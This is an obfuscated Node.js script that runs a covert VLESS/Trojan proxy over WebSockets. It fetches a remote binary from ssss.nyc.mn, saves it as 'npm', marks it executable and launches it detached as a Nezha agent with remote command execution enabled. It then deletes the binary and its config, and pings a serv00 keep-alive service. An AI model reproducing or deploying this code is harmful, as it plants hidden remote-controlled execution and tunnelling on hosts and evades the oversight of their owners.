const _0x3d914d=_0x5a81;(function(_0x3f9d0d,_0x3c17b6){const _0x4c266b=_0x5a81,_0x45e7e6=_0x3f9d0d();while(!![]){try{const _0x278003=-parseInt(_0x4c266b(0x101))/0x1*(parseInt(_0x4c266b(0x13c))/0x2)+parseInt(_0x4c266b(0x103))/0x3+parseInt(_0x4c266b(0xf8))/0x4+-parseInt(_0x4c266b(0x12f))/0x5+parseInt(_0x4c266b(0x119))/0x6+parseInt(_0x4c266b(0x129))/0x7*(-parseInt(_0x4c266b(0x137))/0x8)+parseInt(_0x4c266b(0x132))/0x9;if(_0x278003===_0x3c17b6)break;else _0x45e7e6['push'](_0x45e7e6['shift']());}catch(_0x32e5a1){_0x45e7e6['push'](_0x45e7e6['shift']());}}}(_0x272c,0x9822f));const os=require('os'),http=require(_0x3d914d(0x126)),fs=require('fs'),axios=require(_0x3d914d(0x135)),net=require(_0x3d914d(0xf4)),path=require('path'),crypto=require(_0x3d914d(0x100)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x3d914d(0xfe),NEZHA_SERVER=process['env'][_0x3d914d(0x131)]||'',NEZHA_PORT=process[_0x3d914d(0xcd)][_0x3d914d(0x112)]||'',NEZHA_KEY=process[_0x3d914d(0xcd)][_0x3d914d(0x130)]||'',DOMAIN=process[_0x3d914d(0xcd)][_0x3d914d(0xf2)]||_0x3d914d(0xfa),AUTO_ACCESS=process['env']['AUTO_ACCESS']||!![],WSPATH=process[_0x3d914d(0xcd)][_0x3d914d(0xf7)]||UUID[_0x3d914d(0xea)](0x0,0x8),SUB_PATH=process['env'][_0x3d914d(0xe9)]||_0x3d914d(0xca),NAME=process[_0x3d914d(0xcd)][_0x3d914d(0xe2)]||_0x3d914d(0x12a),PORT=process[_0x3d914d(0xcd)][_0x3d914d(0xe6)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x40e2b0=_0x3d914d;try{const _0x42c42d=await axios[_0x40e2b0(0xe7)](_0x40e2b0(0x115)),_0x5467aa=_0x42c42d[_0x40e2b0(0xdb)];ISP=(_0x5467aa[_0x40e2b0(0xda)]+'-'+_0x5467aa[_0x40e2b0(0xd1)])[_0x40e2b0(0x140)](/ /g,'_');}catch(_0x144794){ISP=_0x40e2b0(0x121);}};function _0x272c(){const _0x420fb2=['pipe','Automatic\x20Access\x20Task\x20added\x20successfully',':443?security=tls&sni=','utf-8','chmod\x20+x\x20npm','NAME','&path=%2F','map','close','PORT','get','arm64','SUB_PATH','slice','application/json','finish','log','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','error','post','createHash','DOMAIN','writeHead','net','connect','\x20-p\x20','WSPATH','3283252DMqacB','utf8','1234.abc.com','config.yaml','npm\x20running\x20error:','includes','5efabea4-f6d4-91fd-b8f0-17e004c89c60','type','crypto','2CQDMWK','catch','1643109NUlEkT','Failed\x20to\x20resolve\x20','createWriteStream','readUInt16BE','npm\x20download\x20successfully','aarch64','unlink','join','text/plain','https://arm64.ssss.nyc.mn/agent','toString','listen','text/html','trim','false','NEZHA_PORT','trojan://','split','https://speed.cloudflare.com/meta','then','https://dns.google/resolve?name=','url','3363006yRMuDY','writeFileSync','443','setsid\x20nohup\x20./npm\x20-s\x20','send','8443','update','sha224','Unknown','write','error:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','readUInt8','http','Server','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','198758IyFHwT','Hug','&fp=chrome&type=ws&host=','Server\x20is\x20running\x20on\x20port\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2087','3321165zVEPZt','NEZHA_KEY','NEZHA_SERVER','9263187bIjoBt','connection','8.8.4.4','axios','createServer','232dWnvWc','https://amd64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/v1','base64','npm','847450LjXWHj','length',':443?encryption=none&security=tls&sni=','message','replace','arch','end','2053','true','Hello\x20world!','npm\x20is\x20already\x20running,\x20skip\x20running...','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','&type=A','sub','Status','substr','env','reduce','find','application/dns-json','asOrganization','every','Not\x20Found\x0a','pop','hex','https://oooo.serv00.net/add-url','Answer','decode','once','country','data','--tls'];_0x272c=function(){return _0x420fb2;};return _0x272c();}GetISP();const httpServer=http[_0x3d914d(0x136)]((_0x5245a6,_0x4a5b1b)=>{const _0x3c0315=_0x3d914d;if(_0x5245a6['url']==='/'){const _0x6eb4e0=path[_0x3c0315(0x10a)](__dirname,'index.html');fs['readFile'](_0x6eb4e0,_0x3c0315(0xf9),(_0x1aa64a,_0x3540cc)=>{const _0x168fce=_0x3c0315;if(_0x1aa64a){_0x4a5b1b[_0x168fce(0xf3)](0xc8,{'Content-Type':_0x168fce(0x10f)}),_0x4a5b1b['end'](_0x168fce(0xc6));return;}_0x4a5b1b[_0x168fce(0xf3)](0xc8,{'Content-Type':'text/html'}),_0x4a5b1b[_0x168fce(0x142)](_0x3540cc);});return;}else{if(_0x5245a6[_0x3c0315(0x118)]==='/'+SUB_PATH){const _0x28f003='vless://'+UUID+'@'+DOMAIN+_0x3c0315(0x13e)+DOMAIN+_0x3c0315(0x12b)+DOMAIN+_0x3c0315(0xe3)+WSPATH+'#'+NAME+'-'+ISP,_0x192fe2=_0x3c0315(0x113)+UUID+'@'+DOMAIN+_0x3c0315(0xdf)+DOMAIN+_0x3c0315(0x12b)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x334b91=_0x28f003+'\x0a'+_0x192fe2,_0x2ae76f=Buffer['from'](_0x334b91)[_0x3c0315(0x10d)](_0x3c0315(0x13a));_0x4a5b1b[_0x3c0315(0xf3)](0xc8,{'Content-Type':_0x3c0315(0x10b)}),_0x4a5b1b[_0x3c0315(0x142)](_0x2ae76f+'\x0a');}else _0x4a5b1b[_0x3c0315(0xf3)](0x194,{'Content-Type':'text/plain'}),_0x4a5b1b[_0x3c0315(0x142)](_0x3c0315(0xd3));}}),wss=new WebSocket[(_0x3d914d(0x127))]({'server':httpServer}),uuid=UUID[_0x3d914d(0x140)](/-/g,''),DNS_SERVERS=[_0x3d914d(0x134),'1.1.1.1'];function resolveHost(_0x356f3a){return new Promise((_0x1f3bcc,_0x2c30e3)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x356f3a)){_0x1f3bcc(_0x356f3a);return;}let _0x52ecda=0x0;function _0x3ed7d5(){const _0x417246=_0x5a81;if(_0x52ecda>=DNS_SERVERS[_0x417246(0x13d)]){_0x2c30e3(new Error(_0x417246(0x104)+_0x356f3a+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x5853a9=DNS_SERVERS[_0x52ecda];_0x52ecda++;const _0x1ba827=_0x417246(0x117)+encodeURIComponent(_0x356f3a)+_0x417246(0xc9);axios['get'](_0x1ba827,{'timeout':0x1388,'headers':{'Accept':_0x417246(0xd0)}})['then'](_0x1daa0d=>{const _0x3eace5=_0x417246,_0x47061e=_0x1daa0d[_0x3eace5(0xdb)];if(_0x47061e[_0x3eace5(0xcb)]===0x0&&_0x47061e['Answer']&&_0x47061e[_0x3eace5(0xd7)][_0x3eace5(0x13d)]>0x0){const _0x29eb0e=_0x47061e[_0x3eace5(0xd7)][_0x3eace5(0xcf)](_0x2f09c7=>_0x2f09c7[_0x3eace5(0xff)]===0x1);if(_0x29eb0e){_0x1f3bcc(_0x29eb0e[_0x3eace5(0xdb)]);return;}}_0x3ed7d5();})[_0x417246(0x102)](_0x5cbea9=>{_0x3ed7d5();});}_0x3ed7d5();});}function handleVlessConnection(_0x51a5c7,_0x3bb91f){const _0xfc6268=_0x3d914d,[_0x2e96e6]=_0x3bb91f,_0x4657f0=_0x3bb91f[_0xfc6268(0xea)](0x1,0x11);if(!_0x4657f0[_0xfc6268(0xd2)]((_0x3ae0d0,_0x1fcbb2)=>_0x3ae0d0==parseInt(uuid[_0xfc6268(0xcc)](_0x1fcbb2*0x2,0x2),0x10)))return![];let _0x583b6a=_0x3bb91f[_0xfc6268(0xea)](0x11,0x12)[_0xfc6268(0x125)]()+0x13;const _0x2e4ddc=_0x3bb91f[_0xfc6268(0xea)](_0x583b6a,_0x583b6a+=0x2)[_0xfc6268(0x106)](0x0),_0x428687=_0x3bb91f['slice'](_0x583b6a,_0x583b6a+=0x1)[_0xfc6268(0x125)](),_0x3de6f0=_0x428687==0x1?_0x3bb91f[_0xfc6268(0xea)](_0x583b6a,_0x583b6a+=0x4)[_0xfc6268(0x10a)]('.'):_0x428687==0x2?new TextDecoder()[_0xfc6268(0xd8)](_0x3bb91f['slice'](_0x583b6a+0x1,_0x583b6a+=0x1+_0x3bb91f[_0xfc6268(0xea)](_0x583b6a,_0x583b6a+0x1)[_0xfc6268(0x125)]())):_0x428687==0x3?_0x3bb91f[_0xfc6268(0xea)](_0x583b6a,_0x583b6a+=0x10)[_0xfc6268(0xce)]((_0x185a96,_0x5501c3,_0x15e956,_0x35d629)=>_0x15e956%0x2?_0x185a96['concat'](_0x35d629[_0xfc6268(0xea)](_0x15e956-0x1,_0x15e956+0x1)):_0x185a96,[])[_0xfc6268(0xe4)](_0x212a4d=>_0x212a4d[_0xfc6268(0x106)](0x0)[_0xfc6268(0x10d)](0x10))[_0xfc6268(0x10a)](':'):'';_0x51a5c7[_0xfc6268(0x11d)](new Uint8Array([_0x2e96e6,0x0]));const _0x3f32ea=createWebSocketStream(_0x51a5c7);return resolveHost(_0x3de6f0)[_0xfc6268(0x116)](_0x3331fe=>{const _0x2b5f1c=_0xfc6268;net[_0x2b5f1c(0xf5)]({'host':_0x3331fe,'port':_0x2e4ddc},function(){const _0x3c6567=_0x2b5f1c;this[_0x3c6567(0x122)](_0x3bb91f['slice'](_0x583b6a)),_0x3f32ea['on'](_0x3c6567(0xef),()=>{})[_0x3c6567(0xdd)](this)['on'](_0x3c6567(0xef),()=>{})[_0x3c6567(0xdd)](_0x3f32ea);})['on'](_0x2b5f1c(0xef),()=>{});})[_0xfc6268(0x102)](_0x1e9f0a=>{const _0x86ddfa=_0xfc6268;net[_0x86ddfa(0xf5)]({'host':_0x3de6f0,'port':_0x2e4ddc},function(){const _0xc98a44=_0x86ddfa;this[_0xc98a44(0x122)](_0x3bb91f[_0xc98a44(0xea)](_0x583b6a)),_0x3f32ea['on'](_0xc98a44(0xef),()=>{})[_0xc98a44(0xdd)](this)['on'](_0xc98a44(0xef),()=>{})[_0xc98a44(0xdd)](_0x3f32ea);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2565ec,_0x19c6ae){const _0x333a3b=_0x3d914d;try{if(_0x19c6ae[_0x333a3b(0x13d)]<0x3a)return![];const _0xd5ffd9=_0x19c6ae['slice'](0x0,0x38)[_0x333a3b(0x10d)](),_0x1b222f=[UUID];let _0x4260ca=null;for(const _0xc18e2 of _0x1b222f){const _0x25ff26=crypto[_0x333a3b(0xf1)](_0x333a3b(0x120))[_0x333a3b(0x11f)](_0xc18e2)['digest'](_0x333a3b(0xd5));if(_0x25ff26===_0xd5ffd9){_0x4260ca=_0xc18e2;break;}}if(!_0x4260ca)return![];let _0x28da1f=0x38;_0x19c6ae[_0x28da1f]===0xd&&_0x19c6ae[_0x28da1f+0x1]===0xa&&(_0x28da1f+=0x2);const _0x418f48=_0x19c6ae[_0x28da1f];if(_0x418f48!==0x1)return![];_0x28da1f+=0x1;const _0x5a5db1=_0x19c6ae[_0x28da1f];_0x28da1f+=0x1;let _0x3fd8e7,_0x403e07;if(_0x5a5db1===0x1)_0x3fd8e7=_0x19c6ae['slice'](_0x28da1f,_0x28da1f+0x4)[_0x333a3b(0x10a)]('.'),_0x28da1f+=0x4;else{if(_0x5a5db1===0x3){const _0xaa0d0e=_0x19c6ae[_0x28da1f];_0x28da1f+=0x1,_0x3fd8e7=_0x19c6ae['slice'](_0x28da1f,_0x28da1f+_0xaa0d0e)[_0x333a3b(0x10d)](),_0x28da1f+=_0xaa0d0e;}else{if(_0x5a5db1===0x4)_0x3fd8e7=_0x19c6ae['slice'](_0x28da1f,_0x28da1f+0x10)[_0x333a3b(0xce)]((_0x35e432,_0x8a55eb,_0x1cb21f,_0x1aaedb)=>_0x1cb21f%0x2?_0x35e432['concat'](_0x1aaedb[_0x333a3b(0xea)](_0x1cb21f-0x1,_0x1cb21f+0x1)):_0x35e432,[])[_0x333a3b(0xe4)](_0xb0d8d1=>_0xb0d8d1[_0x333a3b(0x106)](0x0)[_0x333a3b(0x10d)](0x10))['join'](':'),_0x28da1f+=0x10;else return![];}}_0x403e07=_0x19c6ae[_0x333a3b(0x106)](_0x28da1f),_0x28da1f+=0x2;_0x28da1f<_0x19c6ae[_0x333a3b(0x13d)]&&_0x19c6ae[_0x28da1f]===0xd&&_0x19c6ae[_0x28da1f+0x1]===0xa&&(_0x28da1f+=0x2);const _0x546f7a=createWebSocketStream(_0x2565ec);return resolveHost(_0x3fd8e7)[_0x333a3b(0x116)](_0xea2e28=>{const _0x3ab2d3=_0x333a3b;net['connect']({'host':_0xea2e28,'port':_0x403e07},function(){const _0x2e010a=_0x5a81;_0x28da1f<_0x19c6ae[_0x2e010a(0x13d)]&&this[_0x2e010a(0x122)](_0x19c6ae[_0x2e010a(0xea)](_0x28da1f)),_0x546f7a['on'](_0x2e010a(0xef),()=>{})[_0x2e010a(0xdd)](this)['on'](_0x2e010a(0xef),()=>{})[_0x2e010a(0xdd)](_0x546f7a);})['on'](_0x3ab2d3(0xef),()=>{});})[_0x333a3b(0x102)](_0x32f7be=>{const _0x2e1ec6=_0x333a3b;net[_0x2e1ec6(0xf5)]({'host':_0x3fd8e7,'port':_0x403e07},function(){const _0x2951a4=_0x2e1ec6;_0x28da1f<_0x19c6ae[_0x2951a4(0x13d)]&&this[_0x2951a4(0x122)](_0x19c6ae[_0x2951a4(0xea)](_0x28da1f)),_0x546f7a['on'](_0x2951a4(0xef),()=>{})[_0x2951a4(0xdd)](this)['on'](_0x2951a4(0xef),()=>{})['pipe'](_0x546f7a);})['on']('error',()=>{});}),!![];}catch(_0x322e54){return![];}}wss['on'](_0x3d914d(0x133),(_0x5d9f08,_0x4ecf66)=>{const _0x23a106=_0x3d914d,_0x35d382=_0x4ecf66[_0x23a106(0x118)]||'';_0x5d9f08[_0x23a106(0xd9)](_0x23a106(0x13f),_0xcbe874=>{const _0x2d1bc9=_0x23a106;if(_0xcbe874[_0x2d1bc9(0x13d)]>0x11&&_0xcbe874[0x0]===0x0){const _0x3070db=_0xcbe874[_0x2d1bc9(0xea)](0x1,0x11),_0x199826=_0x3070db[_0x2d1bc9(0xd2)]((_0x5c19d9,_0x130ebd)=>_0x5c19d9==parseInt(uuid[_0x2d1bc9(0xcc)](_0x130ebd*0x2,0x2),0x10));if(_0x199826){!handleVlessConnection(_0x5d9f08,_0xcbe874)&&_0x5d9f08[_0x2d1bc9(0xe5)]();return;}}!handleTrojanConnection(_0x5d9f08,_0xcbe874)&&_0x5d9f08['close']();})['on'](_0x23a106(0xef),()=>{});});const getDownloadUrl=()=>{const _0xacefdf=_0x3d914d,_0x253e4c=os[_0xacefdf(0x141)]();return _0x253e4c==='arm'||_0x253e4c===_0xacefdf(0xe8)||_0x253e4c===_0xacefdf(0x108)?!NEZHA_PORT?_0xacefdf(0x139):_0xacefdf(0x10c):!NEZHA_PORT?_0xacefdf(0x138):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x500a64=_0x3d914d;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1090e9=getDownloadUrl(),_0x315a6f=await axios({'method':'get','url':_0x1090e9,'responseType':'stream'}),_0x5ea41d=fs[_0x500a64(0x105)](_0x500a64(0x13b));return _0x315a6f[_0x500a64(0xdb)]['pipe'](_0x5ea41d),new Promise((_0x572120,_0x3eeddb)=>{const _0x16d23f=_0x500a64;_0x5ea41d['on'](_0x16d23f(0xec),()=>{const _0xf42212=_0x16d23f;console[_0xf42212(0xed)](_0xf42212(0x107)),exec(_0xf42212(0xe1),_0x189253=>{if(_0x189253)_0x3eeddb(_0x189253);_0x572120();});}),_0x5ea41d['on'](_0x16d23f(0xef),_0x3eeddb);});}catch(_0x2a7c35){throw _0x2a7c35;}},runnz=async()=>{const _0x8c20d0=_0x3d914d;try{const _0x28bc1d=execSync(_0x8c20d0(0xee),{'encoding':_0x8c20d0(0xe0)});if(_0x28bc1d[_0x8c20d0(0x110)]()!==''){console['log'](_0x8c20d0(0xc7));return;}}catch(_0xfd6c36){}await downloadFile();let _0x24d5ef='',_0x5c6094=[_0x8c20d0(0x11b),_0x8c20d0(0x11e),'2096',_0x8c20d0(0x12e),'2083',_0x8c20d0(0x143)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x13d190=_0x5c6094[_0x8c20d0(0xfd)](NEZHA_PORT)?_0x8c20d0(0xdc):'';_0x24d5ef=_0x8c20d0(0x11c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x8c20d0(0xf6)+NEZHA_KEY+'\x20'+_0x13d190+_0x8c20d0(0x12d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x27a416=NEZHA_SERVER[_0x8c20d0(0xfd)](':')?NEZHA_SERVER[_0x8c20d0(0x114)](':')[_0x8c20d0(0xd4)]():'',_0x36b32f=_0x5c6094[_0x8c20d0(0xfd)](_0x27a416)?_0x8c20d0(0xc5):_0x8c20d0(0x111),_0x3aa3a9='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x8c20d0(0x124)+_0x36b32f+_0x8c20d0(0xc8)+UUID;fs[_0x8c20d0(0x11a)](_0x8c20d0(0xfb),_0x3aa3a9);}_0x24d5ef='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console['log'](_0x8c20d0(0x128));return;}}try{exec(_0x24d5ef,{'shell':'/bin/bash'},_0x2d6762=>{const _0xdcc1d1=_0x8c20d0;if(_0x2d6762)console[_0xdcc1d1(0xef)](_0xdcc1d1(0xfc),_0x2d6762);else console[_0xdcc1d1(0xed)]('npm\x20is\x20running');});}catch(_0x2a035f){console['error'](_0x8c20d0(0x123)+_0x2a035f);}};async function addAccessTask(){const _0xdefd3=_0x3d914d;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x138e35='https://'+DOMAIN;try{const _0xd2bdae=await axios[_0xdefd3(0xf0)](_0xdefd3(0xd6),{'url':_0x138e35},{'headers':{'Content-Type':_0xdefd3(0xeb)}});console['log'](_0xdefd3(0xde));}catch(_0x1ccb0a){}}function _0x5a81(_0x984861,_0x2b26cd){const _0x272ca0=_0x272c();return _0x5a81=function(_0x5a8120,_0x15bb09){_0x5a8120=_0x5a8120-0xc5;let _0x2f0801=_0x272ca0[_0x5a8120];return _0x2f0801;},_0x5a81(_0x984861,_0x2b26cd);}const delFiles=()=>{const _0x343205=_0x3d914d;fs[_0x343205(0x109)](_0x343205(0x13b),()=>{}),fs[_0x343205(0x109)](_0x343205(0xfb),()=>{});};httpServer[_0x3d914d(0x10e)](PORT,()=>{const _0x845806=_0x3d914d;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x845806(0x12c)+PORT);});
